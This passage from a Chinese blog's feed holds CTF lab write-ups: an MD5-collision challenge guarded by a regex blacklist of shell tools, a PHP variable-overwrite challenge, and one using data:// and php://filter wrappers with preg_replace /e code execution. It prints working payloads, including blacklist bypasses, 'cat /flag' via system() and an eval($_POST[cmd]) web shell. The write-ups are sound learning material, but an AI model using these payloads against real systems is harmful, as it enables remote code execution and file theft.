(preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd</span><br></pre></td></tr></table></figure><p>这里对cmd的值进行了正则过滤，一般的l像s指令都不可以用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">       echo &#96;$cmd&#96;;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">       echo (&quot;md5 is funny ~&quot;);</span><br></pre></td></tr></table></figure><p>这里说明我们需要POST两个变量：a和b</p><p>它们作为字符串时的值弱比较不相等，md5加密的值强比较要相等（<strong>md5碰撞</strong>）</p><p>这里不太理解，所以先直接抄了wp的md5值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>POST传参</p><p>这里最好不要用hackbar，因为hackbar好像会把md5值再编码</p><p>（这个地方坑了我好久）</p><p>在请求到包后，直接在bp里改包</p><p>原来的GET请求直接改成POST请求</p><p><img src="/2021/08/08/buu/10/image-20210809092901502.png" alt="image-20210809092901502"></p><p>使用还没被ban掉的dir指令</p><p>查询到文件</p><p><img src="/2021/08/08/buu/10/image-20210809092634318.png" alt="image-20210809092634318"></p><p>然后直接用了多数博客都使用的绕过方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;ca\t%20&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="/2021/08/08/buu/10/image-20210809093215609.png" alt="image-20210809093215609"></p><p>看网上还有一种方法读取flag：</p><p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p><p><img src="/2021/08/08/buu/10/1625650-20200130214928556-987685402.png" alt="img"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/wangtanzhi/p/12244096.html">https://www.cnblogs.com/wangtanzhi/p/12244096.html</a></p><p><a href="https://blog.csdn.net/qq_43622442/article/details/106012150">https://blog.csdn.net/qq_43622442/article/details/106012150</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;h5 id=&quot;MD5碰撞的一些例子&quot;&gt;&lt;a href=&quot;#MD5碰撞的一些例子&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 Mark loves cat</title>
    <link href="http://daweitech.github.io/2021/08/07/buu/9/"/>
    <id>http://daweitech.github.io/2021/08/07/buu/9/</id>
    <published>2021-08-07T02:07:01.000Z</published>
    <updated>2021-08-07T08:06:04.188Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ol><li><h5 id="git源码泄露；"><a href="#git源码泄露；" class="headerlink" title=".git源码泄露；"></a>.git源码泄露；</h5></li><li><h5 id="导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）"><a href="#导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）" class="headerlink" title="$$导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）"></a><code>$$</code>导致变量覆盖漏洞（参考<a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞</a>）</h5></li></ol><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p><p><img src="/2021/08/07/buu/9/image-20210807153209853.png" alt="image-20210807153209853"></p><p>没有什么有用信息</p><p>扫描一下目录</p><p><img src="/2021/08/07/buu/9/image-20210807102252828.png" alt="image-20210807102252828"></p><p><img src="/2021/08/07/buu/9/image-20210807102702092.png" alt="image-20210807102702092"></p><p>（调低线程后）</p><p><img src="/2021/08/07/buu/9/image-20210807110900544.png" alt="image-20210807110900544"></p><p>发现存在flag.php</p><p>我们再用GitHack下载下来。</p><p>得到两个文件index.php和flag.php</p><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php:"></a>index.php:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">$yds &#x3D; &quot;dog&quot;;</span><br><span class="line">$is &#x3D; &quot;cat&quot;;</span><br><span class="line">$handsome &#x3D; &#39;yds&#39;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure><h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><h6 id="摘抄部分"><a href="#摘抄部分" class="headerlink" title="摘抄部分"></a>摘抄部分</h6><p><img src="/2021/08/07/buu/9/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>代码中的变量覆盖漏洞</strong></p><p><img src="/2021/08/07/buu/9/202005042321468.png" alt="在这里插入图片描述"></p><p><strong>尝试第一个exit处</strong>，</p><p>看注释，键名不能有flag，而且又要键名为flag的键值等于其中一个键名，你又要我不存在，又要我存在，进不去这个判断，告辞</p><p><img src="/2021/08/07/buu/9/1.jpg" alt="在这里插入图片描述"></p><p><strong>尝试第二个exit处</strong></p><p>我们想要通过单纯的post参数搞定它是不可能的，因为post处的变量覆盖是让它变成我们可控的值，所以搞不定。</p><p>所以可以通过单纯的get或者get+post搞定</p><p>可以看到这里是输出的$yds变量，那么我们就要通过变量覆盖达到$yds=$flag的效果</p><p>直接说答案比较好分析：get传参 yds=flag；<br>我们看看参数的传递流程：</p><p><img src="/2021/08/07/buu/9/20200504233307150.png" alt="在这里插入图片描述"></p><p><strong>分析：</strong></p><p>在这个里面，首先是 <strong>$x=yds,$=fla</strong>g 。把它带进foreach里面，就变成了$yds=$flag 。</p><p>**$$x就相当于是$($x)**，这样就非常好理解变量覆盖漏洞了。</p><h5 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds&#x3D;flag</span><br></pre></td></tr></table></figure><p><img src="/2021/08/07/buu/9/image-20210807155151631.png" alt="image-20210807155151631"></p><h5 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h5><p>这里是利用了exit($is)。</p><p>我们首先看看，要进入判断，执行exit($is)需要的条件，看注释。</p><p><img src="/2021/08/07/buu/9/20200504233744435.png" alt="在这里插入图片描述"></p><p>那我们就先从post型flag=flag开始：</p><p>我们post的数据，会在这一步，把原来的$flag的值改变，因为$x=flag,$y=flag，然后带进去变成了$flag=flag。</p><p>over，原来的flag值被我们整没了，这条路不通：</p><p><img src="/2021/08/07/buu/9/20200504233839775.png" alt="在这里插入图片描述"></p><p>我们试试get型的flag=flag：<br>（答案：is=flag&amp;flag=flag）</p><p><img src="/2021/08/07/buu/9/20200504234208601.png" alt="在这里插入图片描述"></p><p>首先分析变量覆盖处：</p><p>首先是$x=is,$y=flag,带进去就变成了$is=$flag;<br>现在到了第二个参数,$x=flag,$y=flag，带进去变成$flag=$flag，自己变成自己，没啥影响，没有改变flag 的值，成功。</p><p><img src="/2021/08/07/buu/9/image-20210807155750060.png" alt="image-20210807155750060"></p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>参考博客：</p><p> <a href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_43622442/article/details/105925473">BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_H9_dawn的博客-CSDN博客</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞 - 简书 (jianshu.com)</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞 - 简书 (jianshu.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;h5 id=&quot;git源码泄露；&quot;&gt;&lt;a href=&quot;#git源码泄露；&quot; class=</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 ZJCTF，不过如此</title>
    <link href="http://daweitech.github.io/2021/08/06/buu/8/"/>
    <id>http://daweitech.github.io/2021/08/06/buu/8/</id>
    <published>2021-08-05T23:36:02.000Z</published>
    <updated>2021-08-24T13:40:47.047Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-知识点"><a href="#0x00-知识点" class="headerlink" title="0x00 知识点"></a>0x00 知识点</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents:"></a>file_get_contents:</h4><p>file_get_contents函数把整个文件读入一个字符串中。</p><h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><p>file_get_contents(path,include_path,context,start,max_length)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">path</td><td align="left">必需。规定要读取的文件。</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr><tr><td align="left">start</td><td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td></tr><tr><td align="left">max_length</td><td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td></tr></tbody></table><h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;test.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is a test file with test text.</span><br></pre></td></tr></table></figure><h4 id="text-plain"><a href="#text-plain" class="headerlink" title="text/plain"></a>text/plain</h4><p><a href="https://www.cnblogs.com/soundcode/p/4572251.html">text/html与text/plain有什么区别？ - 左正 - 博客园 (cnblogs.com)</a></p><p>text/plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。</p><h4 id="PHP伪协议中的data-协议"><a href="#PHP伪协议中的data-协议" class="headerlink" title="PHP伪协议中的data://协议"></a>PHP伪协议中的data://协议</h4><p>摘抄于：<a href="https://blog.csdn.net/qq_46091464/article/details/106665358">文件包含漏洞之PHP伪协议中的data://的那些事~_Firebasky的博客-CSDN博客</a></p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;include.php</span><br><span class="line">&lt;?php</span><br><span class="line">    @$file  &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    @include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><strong>无法使用</strong></p><p>payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><p><strong>无法使用</strong></p><p>payload3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,*PD9waHAgc3lzdGVtKCJkaXIiKTs&#x2F;Pg&#x3D;&#x3D;*</span><br></pre></td></tr></table></figure><p><strong>可以使用</strong></p><p>总结：<br>通过实验发现这个可能是编码的问题因为<?php phpinfo();?>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法</p><p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。</p><p>2.添加空格改变base64编码。</p><p>3.将+号换成%2b</p><p>所以其实不需要通过base64编码来实现！！！<br>将<?php phpinfo();?>改变成url编码。这样浏览器可以识别！<br><img src="/2021/08/06/buu/8/20200610150733928.png" alt="在这里插入图片描述"></p><h4 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h4><p>摘抄于：</p><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter 的使用_hhh-CSDN博客</a></p><p>​    php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；</p><p>​    根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；</p><p>构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;recource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>​    这句话的意思是我们用base64编码的方式来读文件index.php；</p><p>​    这时页面会显示出源文件index.php经过base64编码后的内容，然后经过base64解码就可以看到flag；</p><p><strong>总之呢，php://filter协议有一下几个应用：</strong></p><p>1、利用base64获得源码</p><p>2、通过读写编码实行绕过操作</p><p><strong>问：为什么需要用base64才可以看到源码 如果本地源码是明文的话那是不是不用过滤器</strong>？</p><p>​    include一个文件中有php代码会进行php解析，如果是明文，则会直接返回明文。用了过滤器，如果是php文件就不会解析，就可以拿到php文件的源码了</p><p>​    先把要读取的内容经过base64编码然后才能显示出来，之后我们再经过解码就可以是可读的了</p><h4 id="preg-replace（）函数"><a href="#preg-replace（）函数" class="headerlink" title="preg_replace（）函数"></a>preg_replace（）函数</h4><p>文章：<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p><h3 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h3><p><img src="/2021/08/06/buu/8/image-20210806084045764.png" alt="image-20210806084045764"></p><p>代码内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;</span><br><span class="line">  echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">  if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">    die(&quot;Not now!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  include($file); &#x2F;&#x2F;next.php</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传两个参数，text和file，之间用&amp;连接即可</p><p>目的是获得下列提示的    next.php</p><p>要满足传入的文件内容为：I have a dream</p><p>使用php伪协议中的data:协议和php的filter:协议</p><p>构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure><p><img src="/2021/08/06/buu/8/image-20210806083956451.png" alt="image-20210806083956451"></p><p>解码后代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line"></span><br><span class="line">  return preg_replace(</span><br><span class="line"></span><br><span class="line">​    &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line"></span><br><span class="line">​    &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line"></span><br><span class="line">​    $str</span><br><span class="line"></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line"></span><br><span class="line">  echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line"></span><br><span class="line">  @eval($_GET[&#39;cmd&#39;]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现 preg_replace（）函数是一个代码执行的问题</p><p>发现这是用固定解题格式： <strong>\S*=${}</strong></p><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p><img src="/2021/08/06/buu/8/image-20210806091905315.png" alt="image-20210806091905315"></p><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;eval($_POST[cmd])&#125;</span><br></pre></td></tr></table></figure><p>输错就会·提示相关函数过滤（这里我是斜杆的符号方向输错导致被匹配过滤）</p><p><img src="/2021/08/06/buu/8/image-20210806092259983.png" alt="image-20210806092259983"></p><p>上传成功：</p><p><img src="/2021/08/06/buu/8/image-20210806092509267.png" alt="image-20210806092509267"></p><p><img src="/2021/08/06/buu/8/image-20210806092557240.png" alt="image-20210806092557240"></p><p>或者</p><p><img src="/2021/08/06/buu/8/image-20210806092640868.png" alt="image-20210806092640868"></p><p>借鉴博客：[<a href="https://blog.csdn.net/qq_48008847/article/details/118804275">BJDCTF2020]ZJCTF，不过如此1_十九不瞌睡的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00-知识点&quot;&gt;&lt;a href=&quot;#0x00-知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00 知识点&quot;&gt;&lt;/a&gt;0x00 知识点&lt;/h3&gt;&lt;h4 id=&quot;file-get-contents&quot;&gt;&lt;a href=&quot;#file-get-con</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
</feed>
